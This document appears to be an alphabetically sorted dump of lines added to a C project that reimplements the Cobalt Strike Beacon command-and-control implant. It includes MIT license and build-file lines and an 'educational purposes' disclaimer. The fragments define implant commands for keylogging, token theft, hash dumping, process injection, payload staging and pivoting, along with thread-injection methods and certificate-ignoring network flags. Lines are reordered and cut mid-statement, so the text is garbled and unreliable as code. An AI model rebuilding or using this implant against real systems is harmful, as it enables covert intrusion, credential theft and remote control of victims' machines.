+DWORD   sleep_mask_total_size
+DWORD ExpandEnvironmentStrings_s(const char
+DWORD SpawnToExpand(char
+DWORD accessType
+DWORD available
+DWORD bodyLength
+DWORD bytesAvailable = 0
+DWORD bytesReturned
+DWORD callbackType
+DWORD count = 0
+DWORD domainLength = sizeof(domain)
+DWORD error = WSAGetLastError()
+DWORD flOldProtect
+DWORD gContext
+DWORD gNetworkOptions
+DWORD headerSize = 0
+DWORD keyPtrMagic
+DWORD lastError = GetLastError()
+DWORD lpTotalBytesAvail
+DWORD mode = PIPE_READMODE_BYTE
+DWORD nameLength = sizeof(name)
+DWORD now = GetTickCount()
+DWORD pid
+DWORD read = 0
+DWORD returnLength
+DWORD sid
+DWORD smartInjectMagic
+DWORD statusCodeLength = sizeof(status)
+DWORD timeout = GetTickCount() 
+DWORD totalBytesAvail = 0
+DWORD totalRead = 0
+DWORD wrote
+DWORD64 hash
+DWORD64 reg = ctx.Ebx
+DWORD64 reg = ctx.Rdx
+Debug
+DeleteFileA(filepath)
+DeleteFileA(lpPathName)
+DeleteProcThreadAttributeList(lpAttributeList)
+Die()
+DisconnectNamedPipe(
+DisconnectNamedPipe(file)
+DisconnectNamedPipe(hFile)
+DisconnectNamedPipe(hPrenamedPipe)
+DisconnectNamedPipe(job->hRead)
+DisconnectNamedPipe(protocol->channel.handle)
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+DownloadCloseSafely(download)
+EXPANDED_CMD cmds
+EndGlobal
+EndGlobalSection
+EndProject
+ExitProcess(0)
+ExitThread(0)
+FARPROC (
+FD_ZERO(
+FILE
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+FN_KERNEL32_CREATETHREAD pCreateThread
+FN_KERNEL32_GETPROCADDRESS pGetProcAddress
+FN_KERNEL32_LOADLIBRARYA pLoadLibraryA
+FN_KERNEL32_VIRTUALALLOC pVirtualAlloc
+FN_KERNEL32_VIRTUALPROTECT pVirtualProtect
+FakesAssemblies/
+FileTimeToSystemTime(
+FilesystemFindAndProcess(
+FilesystemPwd()
+FilesystemRemoveDirectoryChildren(filepath)
+FindClose(firstFile)
+FindClose(hFindFile)
+FlushFileBuffers(hFile)
+FlushFileBuffers(protocol->channel.handle)
+FodyWeavers.xsd
+FreeSid(sid)
+Generated
+Generated_Code/
+GetStartupInfoA(
+GetSystemTime(
+GetVersionExA(osVersionInfo)
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HANDLE file
+HANDLE gIdentityToken
+HANDLE hCurrentThread = GetCurrentThread()
+HANDLE hElevationToken
+HANDLE hFile
+HANDLE hModule = GetModuleHandleA(lpModuleName)
+HANDLE hPipe
+HANDLE hPreelevationAuxThread
+HANDLE hPrenamedPipe
+HANDLE hProcess = GetCurrentProcess()
+HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD 
+HANDLE hProcess = OpenProcess(SelfIsWindowsVistaOrLater() 
+HANDLE hRead
+HANDLE hThread
+HANDLE hThread = NULL
+HANDLE hThread = injection->thread
+HANDLE hToken
+HANDLE hWrite
+HANDLE handle
+HANDLE process
+HANDLE processHeap = GetProcessHeap()
+HANDLE thread
+HEAP_RECORD
+HEAP_RECORD 
+HINTERNET gInternetConnect
+HINTERNET gInternetOpen
+HINTERNET hInternet = HttpOpenRequestA(
+HINTERNET hRequest = HttpOpenRequestA(
+HMODULE (
+HOSTENT
+HideSolutionNode = FALSE
+INJECTION injection
+INTERFACE_INFO interfaceInfo[20]
+INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+INTERNET_FLAG_IGNORE_CERT_DATE_INVALID 
+INTERNET_FLAG_KEEP_CONNECTION 
+INTERNET_FLAG_NO_CACHE_WRITE 
+INTERNET_FLAG_NO_UI
+IdentityConditionalImpersonate(ignoreToken)
+IdentityConditionalRevert(ignoreToken)
+IdentityElevatePost()
+IdentityGetUid()
+IdentityGetUidInternal(gIdentityToken)
+IdentityGetUidInternal(hToken)
+IdentityImpersonateToken()
+IdentityRevertToken()
+ImpersonateLoggedOnUser(gIdentityToken)
+Inject Functions 
+InjectAndExecute(
+InternetCloseHandle(gInternetConnect)
+InternetCloseHandle(gInternetOpen)
+InternetCloseHandle(hInternet)
+InternetCloseHandle(hRequest)
+JOB_ENTRY
+JobCleanup()
+JobPrintAll()
+JobRegisterProcess(
+LINK_ENTRY
+LINK_ENTRY gLinks[MAX_LINKS] = { 0 }
+LPCSTR proxy
+LPPROC_THREAD_ATTRIBUTE_LIST ProcThreadAttributeListInit(DWORD dwAttributeCount)
+LPTHREAD_START_ROUTINE gThreadStartAddress
+LPTHREAD_START_ROUTINE lpStartAddress
+LPVOID lpAddress
+LPVOID lpBaseAddress = NULL
+LPVOID lpParameter
+LPVOID lpStartAddress
+LPWIN32_FIND_DATAA lpCurrentFindFileData = findData
+LinkAdd(
+MIT License
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+NDEBUG
+NetworkInit()
+NetworkUpdateSettings(hInternet)
+NetworkUpdateSettings(hRequest)
+OSVERSIONINFOA
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+OpenCover/
+PAPC_ROUTINE_CONTEXT pAllocedData = malloc(dwSize)
+PAYLOAD
+PDATA_STORE_OBJECT
+PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index)
+PROC
+PROC dynamicFns[MAX_DYNAMIC_FUNCTIONS]
+PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) }
+PROCESS_INFORMATION
+PROCESS_INFORMATION pi
+PROCESS_INFORMATION pi = { 0 }
+PROTOCOL
+PROTOCOL protocol
+PRUN_UNDER_CONTEXT ChildProcessContextInit(PRUN_UNDER_CONTEXT context)
+PRUN_UNDER_CONTEXT ParentProcessContextInit(PRUN_UNDER_CONTEXT
+PSID sid
+PTHREAD_INFO
+PVOID oldValue
+PWEB_RESPONSE
+Package.StoreAssociation.xml
+ParentProcessContextInit(
+PipeCloseInternal(bid)
+Please note that this project is not a reverse-engineered version of the Cobalt Strike Beacon but a ground-up open-source implementation. The 
+ProcThreadAttributeListDestroy(lpAttributeList)
+ProtocolSmbInit(
+ProtocolSmbOpenExplicit(buffer)
+ProtocolTcpInit(
+PublishScripts/
+RECORD record
+RECORD_ENTRY
+ROUTE_DATA
+RTL_USER_PROCESS_PARAMETERS processParameters
+RUN_UNDER_CONTEXT childContext = 
+RUN_UNDER_CONTEXT context
+RUN_UNDER_CONTEXT parentContext = 
+Release
+RemoveDirectoryA(filepath)
+RemoveDirectoryA(lpPathName)
+ResumeThread(execution->processInfo->hThread)
+RevertToSelf()
+SECURITY_FLAG_IGNORE_CERT_CN_INVALID 
+SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
+SECURITY_FLAG_IGNORE_UNKNOWN_CA 
+SECURITY_FLAG_IGNORE_WRONG_USAGE 
+SESSION gSession
+SHORT headerLength = BeaconDataShort(
+SHORT isDead
+SHORT isPipe
+SHORT mzSignature
+SHORT ordinal
+SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY
+SIZE_T dwSize = sizeof(APC_ROUTINE_CONTEXT) 
+SIZE_T dwViewSize = 0
+SIZE_T payloadSize = (DWORD64)NtQueueApcThreadProc_End - (DWORD64)NtQueueApcThreadProc
+SIZE_T read
+SIZE_T size = 0
+SIZE_T spawnSize = BeaconDataLength(
+SIZE_T srcLength = strlen(domains)
+SIZE_T wrote
+SOCKET LinkViaTcpConnect(char
+SOCKET acceptSocket = INVALID_SOCKET
+SOCKET sock = (SOCKET)channel->socket
+SOCKET socket
+SOCKET targetSocket
+SOFTWARE.
+STARTUPINFO
+STARTUPINFOA si = { sizeof(STARTUPINFOA) }
+STARTUPINFOA si = { sizeof(si) }
+STARTUPINFOEXA si_
+SYSTEMTIME now
+ScaffoldingReadMe.txt
+ServiceFabricBackup/
+SetCurrentDirectoryA(path)
+SetErrorMode(context->previousErrorMode)
+SetErrorMode)
+SetLastError(WAIT_TIMEOUT)
+Sleep(100)
+Sleep(1000)
+Sleep(200)
+Sleep(500)
+Sleep(ATTEMPT_SLEEP)
+Sleep(iterWaitTime)
+Sleep(millis)
+SolutionGuid = {9AAA762A-4780-430A-8D4B-C5630A3469B4}
+StyleCopReport.xml
+THREADENTRY32 te32 = { sizeof(THREADENTRY32) }
+TOKEN_PRIVILEGES tokenPrivileges = { 0 }
+TRANSFORM transform
+TestResult.xml
+The above copyright notice and this permission notice shall be included in all
+This project is for educational and research purposes only. Use it responsibly and in compliance with applicable laws and regulations. The authors and contributors are not responsible for any misuse or damage caused by the use of this software.
+This project is licensed under the [MIT License](LICENSE.md).
+TransformDestroy(
+TransformEncode(
+TransformInit(
+UINT previousErrorMode
+ULONG NetworkGetActiveAdapterIPv4()
+ULONG activeAdapterIPv4 = NetworkGetActiveAdapterIPv4()
+ULONG64 processAttribute
+UNICODE_STRING commandLine = { 0 }
+UnmapViewOfFile(lpFileMap)
+UpgradeLog
+VOID(WINAPI
+ViewUnmap = 2
+VirtualFree
+VisualStudioVersion = 17.7.34031.279
+WCHAR
+WCHAR buffer[1024] = { 0 }
+WCHAR cmd[1024] = { 0 }
+WEB_RESPONSE
+WIN32_FIND_DATAA findData
+WOW64_CONTEXT context
+WSACleanup()
+WSADATA wsaData
+WebResponseDestroy(webResponse)
+Win32
+Wow64Process) 
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Oo]ut/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+[[noreturn]] void BeaconInterrupt()
+] = (HEAP_RECORD) {
+] = domain
+] = token
+_CONSOLE
+_Chutzpah
+_DEBUG
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__VA_ARGS__)
+__declspec(noinline) void CFGCautionThreadStub(THREAD_INFO
+__declspec(noinline) void CFGCautionThreadStubEnd(void) {}
+__declspec(noinline) void NtQueueApcThreadProc(PAPC_ROUTINE_CONTEXT pData)
+__declspec(noinline) void NtQueueApcThreadProc_End(void) {}
+__int64 pid
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+acceptSocket = socket
+accessType = INTERNET_OPEN_TYPE_DIRECT
+accessType = INTERNET_OPEN_TYPE_PRECONFIG
+accessType = INTERNET_OPEN_TYPE_PROXY
+accountName[0] = '
+addr.sin_family = AF_INET
+addr.sin_port = htons(port)
+aes_desc)
+api = malloc(sizeof(bapi))
+api->dynamicFns[index]
+argp = 0
+argp) == SOCKET_ERROR
+argp) == SOCKET_ERROR)
+argument = (ARGUMENT_ENTRY
+argument = current
+argument->isActive = TRUE
+artifacts/
+asmx</Extensions>
+attempts = 0
+attempts > 0)
+attempts >= 20)
+attempts >= S_MAX_RETRY_STRATEGY_ATTEMPTS)
+attempts >= S_MAX_RETRY_STRATEGY_INCREASE 
+bapi 
+bash
+beaconApi = (bapi){
+bid = htonl(bid)
+bld/
+bower_components/
+break
+buffer 
+buffer = BeaconDataBuffer(
+buffer[bufferSize] = 0
+buffer[length] = '
+buffer[parser->length] = 0
+buffer[size - 1] = 0
+bytesAvailable) 
+bytesPair)
+callback_close:
+case COMMAND_ARGUE_ADD:
+case COMMAND_ARGUE_LIST:
+case COMMAND_ARGUE_REMOVE:
+case COMMAND_BLOCKDLLS:
+case COMMAND_CANCEL_DOWNLOAD:
+case COMMAND_CD:
+case COMMAND_CLOSE:
+case COMMAND_CONNECT:
+case COMMAND_DIE:
+case COMMAND_DOWNLOAD:
+case COMMAND_ELEVATE_POST:
+case COMMAND_ELEVATE_PRE:
+case COMMAND_EXECUTE:
+case COMMAND_EXECUTE_JOB:
+case COMMAND_FILE_COPY:
+case COMMAND_FILE_DRIVES:
+case COMMAND_FILE_LIST:
+case COMMAND_FILE_MKDIR:
+case COMMAND_FILE_MOVE:
+case COMMAND_FILE_RM:
+case COMMAND_GETPRIVS:
+case COMMAND_INJECTX64_PID_PING:
+case COMMAND_INJECTX64_PING:
+case COMMAND_INJECT_PID_PING:
+case COMMAND_INJECT_PING:
+case COMMAND_INLINE_EXECUTE_OBJECT:
+case COMMAND_JOBS:
+case COMMAND_JOB_KILL:
+case COMMAND_JOB_REGISTER:
+case COMMAND_JOB_REGISTER_IMPERSONATE:
+case COMMAND_JOB_REGISTER_MSGMODE:
+case COMMAND_JOB_SPAWN_TOKEN_X64:
+case COMMAND_JOB_SPAWN_TOKEN_X86:
+case COMMAND_JOB_SPAWN_X64:
+case COMMAND_JOB_SPAWN_X86:
+case COMMAND_LISTEN:
+case COMMAND_LOGINUSER:
+case COMMAND_LSOCKET_BIND:
+case COMMAND_LSOCKET_BIND_LOCALHOST:
+case COMMAND_LSOCKET_CLOSE:
+case COMMAND_LSOCKET_TCPPIVOT:
+case COMMAND_PAUSE:
+case COMMAND_PIPE_CLOSE:
+case COMMAND_PIPE_OPEN_EXPLICIT:
+case COMMAND_PIPE_REOPEN:
+case COMMAND_PIPE_ROUTE:
+case COMMAND_PPID:
+case COMMAND_PSH_HOST_TCP:
+case COMMAND_PSH_IMPORT:
+case COMMAND_PS_KILL:
+case COMMAND_PS_LIST:
+case COMMAND_PWD:
+case COMMAND_RUNAS:
+case COMMAND_RUN_UNDER_PID:
+case COMMAND_SEND:
+case COMMAND_SETENV:
+case COMMAND_SLEEP:
+case COMMAND_SPAWNAS_X64:
+case COMMAND_SPAWNAS_X86:
+case COMMAND_SPAWNU_X64:
+case COMMAND_SPAWNU_X86:
+case COMMAND_SPAWNX64:
+case COMMAND_SPAWN_PROC_X64:
+case COMMAND_SPAWN_PROC_X86:
+case COMMAND_SPAWN_TOKEN_X64:
+case COMMAND_SPAWN_TOKEN_X86:
+case COMMAND_STAGE_PAYLOAD:
+case COMMAND_STAGE_PAYLOAD_SMB:
+case COMMAND_STEAL_TOKEN:
+case COMMAND_TCP_CONNECT:
+case COMMAND_TOKEN_GETUID:
+case COMMAND_TOKEN_REV2SELF:
+case COMMAND_UPLOAD:
+case COMMAND_UPLOAD_CONTINUE:
+case COMMAND_WEBSERVER_LOCAL:
+case DATA_ARGUMENT_OUTPUT:
+case DATA_ARGUMENT_SESSION_DATA:
+case METHOD_CREATE_REMOTE_THREAD:
+case METHOD_CREATE_REMOTE_THREAD_S:
+case METHOD_CREATE_THREAD:
+case METHOD_CREATE_THREAD_S:
+case METHOD_NT_QUEUE_APC_THREAD:
+case METHOD_NT_QUEUE_APC_THREAD_S:
+case METHOD_RTL_CREATE_USER_THREAD:
+case METHOD_SET_THREAD_CONTEXT:
+case STEP_APPEND:
+case STEP_BASE64:
+case STEP_BASE64URL:
+case STEP_BUILD:
+case STEP_HEADER:
+case STEP_MASK:
+case STEP_NETBIOS:
+case STEP_NETBIOSU:
+case STEP_PARAMETER:
+case STEP_PREPEND:
+case STEP_PRINT:
+case STEP_URI_APPEND:
+case STEP__HEADER:
+case STEP__HOSTHEADER:
+case STEP__PARAMETER:
+ch->state = CHANNEL_STATE_0
+channel->id == channelId 
+channel->lastActive = GetTickCount()
+channel->socket = sock
+channel->state = CHANNEL_STATE_0
+channel->state = CHANNEL_STATE_1
+channel->type != CHANNEL_TYPE_BIND)
+channelId = ChannelGetId()
+channelId = htonl(channel->id)
+char
+char 
+char  
+char    BeaconDataByte(datap 
+char    mask[MASK_SIZE]
+char BeaconDataByte(datap
+char _[982]
+char accountName[0x200]
+char accountName[2048] = { 0 }
+char accountName[MAX_ACCOUNT_NAME]
+char aux[MAX_CMD] = { 0 }
+char bid[MAX_BID]
+char buf[1]
+char buffer[256] = { 0 }
+char cmd[256]
+char cmd[MAX_CMD]
+char cmd[MAX_PATH]
+char data = 
+char data[1024]
+char data[2048]
+char data[]
+char description[64]
+char description[64] = { 0 }
+char filename[64] = { 0 }
+char finalUri[MAX_URI]
+char flags = 0
+char gCbcKey[16]
+char gHmacKey[16]
+char gIv[16]
+char lBuffer[256] = { 0 }
+char mask[sizeof(gCbcKey) 
+char name[64]
+char name[MAX_NAME]
+char out[16]
+char param[MAX_PARAM] = { 0 }
+char path[1024]
+char remainingData[0x80000]
+char status[256]
+char text[128]
+char toRead[MAX_TO_READ] = { 0 }
+char uidString[0x400]
+char userInfo[0x200]
+childContext)
+childContext.cleanup(
+cleanup:
+cleanup: 
+close)(struct _PROTOCOL
+close:
+closesocket(acceptSocket)
+closesocket(protocol->channel.socket)
+closesocket(sock)
+closesocket(socket)
+closesocket(webResponse->socket)
+cmd[length] = 0
+cmds)
+codePair)
+const DWORD lastError = GetLastError()
+const PEB
+const PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = ProcThreadAttributeListInit(count)
+const PTHREAD_INFO pThreadInfo = malloc(sizeof(THREAD_INFO))
+const WCHAR
+const char
+const char expandedCmd[8192]
+const char expandedFullCmd[8192]
+const int outres = inlen 
+const int raw_inlen = inlen - MASK_SIZE
+const int read = fread(gDownloadChunk->remainingData 
+const int response_len)
+contentLength)
+context)
+context))
+context->cleanup = CleanupChildProcessContext
+context->cleanup = CleanupParentProcessContext
+context->handle = INVALID_HANDLE_VALUE
+context->handle = hProcess
+context->previousErrorMode = SetErrorMode(SEM_NOOPENFILEERRORBOX 
+context->processAttribute = 0x100000000000
+context->updateProcessAttributes = UpdateChildProcessContext
+context->updateProcessAttributes = UpdateParentProcessContext
+context.ContextFlags = CONTEXT_FULL
+context.ContextFlags = CONTEXT_INTEGER
+context.Eax = (DWORD)lpAddress
+context.Eax = (DWORD)lpStartAddress
+context.Rcx = (DWORD64)lpAddress
+context.Rcx = (DWORD64)lpStartAddress
+context.Rdx = (DWORD64)lpParameter
+continue
+copies or substantial portions of the Software.
+count
+coverage
+cppm
+creationFlags 
+crunch
+csx/
+ctx))
+ctx.ContextFlags = CONTEXT_INTEGER
+current = current->next
+current->isActive = FALSE
+currentFunction == NULL)
+currentFunction == newFunction)
+currentSessionId))
+data.isExecuted = TRUE
+dataPair)
+data[x] = '
+datap
+datap parser
+datap parser = { 0 }
+datap relocationsParser
+default:
+define ALLOC_TYPE_MALLOC 1
+define ALLOC_TYPE_VIRTUALALLOC 2
+define ATTEMPT_SLEEP 500
+define CALLBACK_ACCEPT 23
+define CALLBACK_CHUNK_ALLOCATE 28
+define CALLBACK_CHUNK_SEND 29
+define CALLBACK_CLOSE 4
+define CALLBACK_CONNECT 6
+define CALLBACK_DEAD 26
+define CALLBACK_ERROR 31
+define CALLBACK_FILE 2
+define CALLBACK_FILE_CLOSE 9
+define CALLBACK_FILE_WRITE 8
+define CALLBACK_HASHDUMP 21
+define CALLBACK_JOBS 20
+define CALLBACK_KEYSTROKES 1
+define CALLBACK_NETVIEW 24
+define CALLBACK_OUTPUT 0
+define CALLBACK_OUTPUT_OEM 30
+define CALLBACK_OUTPUT_UTF8 32
+define CALLBACK_PENDING 22
+define CALLBACK_PING 7
+define CALLBACK_PIPE_CLOSE 11
+define CALLBACK_PIPE_OPEN 10
+define CALLBACK_PIPE_PING 14
+define CALLBACK_PIPE_READ 12
+define CALLBACK_PORTSCAN 25
+define CALLBACK_POST_ERROR 13
+define CALLBACK_POST_REPLAY_ERROR 18
+define CALLBACK_PROCESS_LIST 17
+define CALLBACK_PWD 19
+define CALLBACK_READ 5
+define CALLBACK_SCREENSHOT 3
+define CALLBACK_SSH_STATUS 27
+define CALLBACK_TOKEN_GETUID 16
+define CALLBACK_TOKEN_STOLEN 15
+define CHANNEL_BUFFER_SIZE 0x100000
+define CHANNEL_STATE_0 0
+define CHANNEL_STATE_1 1
+define CHANNEL_STATE_2 2
+define CHANNEL_STATE_3 3
+define CHANNEL_TYPE_BIND 2
+define CHANNEL_TYPE_CONNECT 0
+define CHANNEL_TYPE_LISTEN 1
+define CHANNEL_TYPE_TCP_PIVOT 3
+define COMMAND_ARGUE_ADD 83
+define COMMAND_ARGUE_LIST 85
+define COMMAND_ARGUE_REMOVE 84
+define COMMAND_BLOCKDLLS 92
+define COMMAND_CANCEL_DOWNLOAD 19
+define COMMAND_CD 5
+define COMMAND_CHECKIN 8
+define COMMAND_CLOSE 16
+define COMMAND_CONNECT 14
+define COMMAND_DIE 3
+define COMMAND_DLL_LOAD 80
+define COMMAND_DOWNLOAD 11
+define COMMAND_ELEVATE_POST 61
+define COMMAND_ELEVATE_PRE 60
+define COMMAND_EXECUTE 12
+define COMMAND_EXECUTE_JOB 78
+define COMMAND_FILE_COPY 73
+define COMMAND_FILE_DRIVES 55
+define COMMAND_FILE_LIST 53
+define COMMAND_FILE_MKDIR 54
+define COMMAND_FILE_MOVE 74
+define COMMAND_FILE_RM 56
+define COMMAND_GETPRIVS 77
+define COMMAND_INJECTX64_PID 43
+define COMMAND_INJECTX64_PID_PING 46
+define COMMAND_INJECTX64_PING 91
+define COMMAND_INJECT_PID 9
+define COMMAND_INJECT_PID_PING 45
+define COMMAND_INJECT_PING 18
+define COMMAND_INJECT_POWERSHELLX64_PID 66
+define COMMAND_INJECT_POWERSHELLX86_PID 65
+define COMMAND_INLINE_EXECUTE 95
+define COMMAND_INLINE_EXECUTE_OBJECT 100
+define COMMAND_JOBS 41
+define COMMAND_JOB_KILL 42
+define COMMAND_JOB_REGISTER 40
+define COMMAND_JOB_REGISTER_IMPERSONATE 62
+define COMMAND_JOB_REGISTER_MSGMODE 101
+define COMMAND_JOB_SPAWN_TOKEN_X64 88
+define COMMAND_JOB_SPAWN_TOKEN_X86 87
+define COMMAND_JOB_SPAWN_X64 71
+define COMMAND_JOB_SPAWN_X86 70
+define COMMAND_KEYLOG_START 6
+define COMMAND_KEYLOG_STOP 7
+define COMMAND_LISTEN 17
+define COMMAND_LOGINUSER 49
+define COMMAND_LSOCKET_BIND 50
+define COMMAND_LSOCKET_BIND_LOCALHOST 102
+define COMMAND_LSOCKET_CLOSE 51
+define COMMAND_LSOCKET_TCPPIVOT 82
+define COMMAND_NOOP 6
+define COMMAND_PAUSE 47
+define COMMAND_PIPE_CLOSE 23
+define COMMAND_PIPE_OPEN_EXPLICIT 68
+define COMMAND_PIPE_REOPEN 24
+define COMMAND_PIPE_ROUTE 22
+define COMMAND_PPID 75
+define COMMAND_PSH_HOST_TCP 79
+define COMMAND_PSH_IMPORT 37
+define COMMAND_PS_KILL 33
+define COMMAND_PS_LIST 32
+define COMMAND_PWD 39
+define COMMAND_REG_QUERY 81
+define COMMAND_RUNAS 38
+define COMMAND_RUN_INJECT_X64 97
+define COMMAND_RUN_INJECT_X86 96
+define COMMAND_RUN_UNDER_PID 76
+define COMMAND_SEND 15
+define COMMAND_SETENV 72
+define COMMAND_SHELL 2
+define COMMAND_SLEEP 4
+define COMMAND_SPAWN 1
+define COMMAND_SPAWNAS_X64 94
+define COMMAND_SPAWNAS_X86 93
+define COMMAND_SPAWNU_X64 99
+define COMMAND_SPAWNU_X86 98
+define COMMAND_SPAWNX64 44
+define COMMAND_SPAWN_POWERSHELLX64 64
+define COMMAND_SPAWN_POWERSHELLX86 63
+define COMMAND_SPAWN_PROC_X64 69
+define COMMAND_SPAWN_PROC_X86 13
+define COMMAND_SPAWN_TOKEN_X64 90
+define COMMAND_SPAWN_TOKEN_X86 89
+define COMMAND_STAGE_PAYLOAD 52
+define COMMAND_STAGE_PAYLOAD_SMB 57
+define COMMAND_STEAL_TOKEN 31
+define COMMAND_TCP_CONNECT 86
+define COMMAND_TIMESTOMP 29
+define COMMAND_TOKEN_GETUID 27
+define COMMAND_TOKEN_REV2SELF 28
+define COMMAND_UPLOAD 10
+define COMMAND_UPLOAD_CONTINUE 67
+define COMMAND_WEBSERVER_LOCAL 59
+define DATA_ARGUMENT_OUTPUT 0x1
+define DATA_ARGUMENT_SESSION_DATA 0x0
+define DATA_SECTION_RELOC 1025
+define DATA_STORE_TYPE_EMPTY 0
+define DATA_STORE_TYPE_GENERAL_FILE 1
+define DYNAMIC_FUNC_RELOC 1027
+define ERROR_ADJUST_ARGUMENTS_BY_ARCH_FAILED 67
+define ERROR_ADJUST_ARGUMENTS_FAILED 65
+define ERROR_ADJUST_PERMISSIONS_FAILED 17
+define ERROR_ALLOC_SECTION_FAILED 73
+define ERROR_CONNECT_TO_PIPE_FAILED 20
+define ERROR_CONNECT_TO_PIPE_TIMEOUT 4
+define ERROR_CONNECT_TO_TARGET_FAILED 68
+define ERROR_COPY_FAILED 13
+define ERROR_CREATE_REMOTE_THREAD_FAILED 72
+define ERROR_CREATE_TOKEN_FAILED 24
+define ERROR_DOWNLOAD_OPEN_FAILED 40
+define ERROR_DOWNLOAD_PATH_TOO_LONG 61
+define ERROR_DOWNLOAD_SIZE_CHECK_FAILED 60
+define ERROR_DUPLICATE_TOKEN_FAILED 38
+define ERROR_IMPERSONATE_LOGGED_ON_USER_FAILED 39
+define ERROR_IMPERSONATE_STEAL_TOKEN_FAILED 37
+define ERROR_IMPERSONATE_TOKEN_FAILED 25
+define ERROR_INJECT_X64_INTO_X86 19
+define ERROR_INJECT_X86_INTO_X64 18
+define ERROR_KILL_FAILED 35
+define ERROR_LENGTHY_WIDECHAR_COMMAND 7
+define ERROR_LIST_OPEN_FAILED 52
+define ERROR_LOCAL_ALLOC_FAILED 31
+define ERROR_MAXIMUM_LINKS_REACHED 2
+define ERROR_MOVE_FAILED 14
+define ERROR_NO_SLOT_FOR_FUNCTION 78
+define ERROR_OPEN_PROCESS_FAILED 33
+define ERROR_OPEN_PROCESS_TOKEN_FAILED 36
+define ERROR_OPEN_PROCESS_TOKEN_PRIVS_FAILED 59
+define ERROR_OPEN_TOKEN_FAILED 1
+define ERROR_PARENT_PROCESS_NOT_IN_SAME_SESSION 15
+define ERROR_POST_IMPERSONATE_TOKEN_FAILED 12
+define ERROR_REAL_FAKE_ARGS_NO_MATCH 66
+define ERROR_RELOCATION_TRUNCATED_TO_FIT 77
+define ERROR_RESOLVE_API_FAILED 76
+define ERROR_RUN_AS_USER_FAILED 53
+define ERROR_SET_PID_FAILED 34
+define ERROR_SOCKET_CREATE_BIND_FAILED 21
+define ERROR_SPAWN_PROCESS_AS_USER_FAILED 41
+define ERROR_SPAWN_PROCESS_FAILED 48
+define ERROR_SPAWN_TOKEN_AND_CREDS 69
+define ERROR_SPAWN_TOKEN_EXTENDED_STARTUPINFO 74
+define ERROR_STAGER_VIA_PIPE_CONNECTION_FAILED 50
+define ERROR_STAGER_VIA_TCP_CONNECTION_FAILED 70
+define ERROR_UNIMPLEMENTED_RELOCATION_TYPE 79
+define ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED 71
+define ERROR_UPLOAD_OPEN_FAILED 8
+define ERROR_WRITE_TO_PROC_MEMORY_FAILED 16
+define EXE_SECTION_RELOC 1026
+define HIDWORD(x) ((DWORD)((DWORD64)(x) >> (8
+define HIDWORD(x) 0
+define HINT_FORWARD 0
+define HINT_PROTO_PIPE 0
+define HINT_PROTO_TCP 0x100000
+define HINT_REVERSE 0x10000
+define IDENTITY_MAX_WCHARS_DOMAIN 256
+define IDENTITY_MAX_WCHARS_PASSWORD 512
+define IDENTITY_MAX_WCHARS_USERNAME 256
+define IS_X64() (FALSE)
+define IS_X64() (TRUE)
+define LAST_ERROR_STR(...)
+define LERROR(...)
+define LINFO(...)
+define LLOG(...)
+define LNEWLINE()
+define LOCALHOST 0x0100007f
+define LODWORD(x) ((DWORD)(x))
+define LOK(...)
+define LTC_HASH_HELPERS
+define LTC_HMAC
+define LTC_NO_HASHES
+define LTC_NO_MACS
+define LTC_SHA256
+define LTM_DESC
+define LTODO(...)
+define LWARNING(...)
+define MASK_SIZE 13
+define MASK_SIZE sizeof(int)
+define MAX_ACCOUNT_NAME 0x200
+define MAX_ARGS 0x2000
+define MAX_ATTEMPTS 4
+define MAX_BID 128
+define MAX_BUFFER 2048
+define MAX_CALLBACK_DATA 0x100
+define MAX_CMD 0x2000
+define MAX_CMD 1024
+define MAX_CMD 256
+define MAX_COMPUTER_NAME 256
+define MAX_DATA_SIZE 0x800
+define MAX_DESCRIPTION 64
+define MAX_DOMAIN 1024
+define MAX_DST 0x2000
+define MAX_DYNAMIC_FUNCTIONS 32
+define MAX_EXISTING_FILENAME 0x2000
+define MAX_EXPANDED 0x2000
+define MAX_EXPANDED_CMD 0x2000
+define MAX_EXPANDED_FULL 0x2000
+define MAX_FILENAME 0x4000
+define MAX_FILENAME 0x8000
+define MAX_FILENAME 2048
+define MAX_FILE_NAME 256
+define MAX_HEADERS 1024
+define MAX_HEADER_SIZE 0x100
+define MAX_INFO 256
+define MAX_LINKS 28
+define MAX_NAME 0x100
+define MAX_NEW_FILENAME 0x2000
+define MAX_ORIGINAL 0x2000
+define MAX_PARAM 1024
+define MAX_PASSWORD 1024
+define MAX_READ 0x1000
+define MAX_REQUEST_PROFILE 1024
+define MAX_ROUTE_AUX 0x100000
+define MAX_RUNNABLE_CMD 0x2000
+define MAX_SPAWN_TO 256
+define MAX_SPAWN_TO_X64 MAX_SPAWN_TO
+define MAX_SPAWN_TO_X86 MAX_SPAWN_TO
+define MAX_SRC 0x2000
+define MAX_TEMP 1024
+define MAX_TO_READ 128
+define MAX_URI 0x400
+define MAX_URI 1024
+define MAX_URI_PARAMS 1024
+define MAX_USERNAME 1024
+define MAX_USER_NAME 256
+define METADATA_FLAG_ADMIN 8
+define METADATA_FLAG_NOTHING 1
